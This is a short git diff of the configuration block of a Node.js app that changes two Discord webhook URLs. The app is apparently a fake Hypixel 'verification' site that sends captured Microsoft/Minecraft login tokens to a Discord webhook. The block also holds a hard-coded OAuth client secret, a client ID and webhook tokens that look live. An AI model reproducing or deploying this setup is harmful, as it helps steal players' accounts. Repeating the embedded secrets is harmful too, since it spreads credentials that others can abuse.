@@ -2,8 +2,8 @@
 const client_secret = 'xYo8Q~4Ln.ZZTHJ36oRdWR1YphlO5yW-XTn0.b7U'
 const client_id = '1ac54ca5-5d3a-4a26-8aa0-da11358f8203'
 const redirect_uri = 'https://verifyapplicationhypixel.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1039969872144252968/yS-AW4qT95gBzBicmc8qhXTSbtdYth1iMaGa3ie68ppFotsA2DueKHfDMYi5uydgIVdH'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1039969872144252968/yS-AW4qT95gBzBicmc8qhXTSbtdYth1iMaGa3ie68ppFotsA2DueKHfDMYi5uydgIVdH'
+const webhook_url = 'https://discord.com/api/webhooks/1039970965624455278/zeusMOtIyHYaO3uT29bOe2sjt5CLk5ha0-wILfvRjPVZvOZXnX3SHfAPSOQx4H_8SVGT'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1039970965624455278/zeusMOtIyHYaO3uT29bOe2sjt5CLk5ha0-wILfvRjPVZvOZXnX3SHfAPSOQx4H_8SVGT'
 // Config end
 const axios = require('axios')
 const express = require('express')
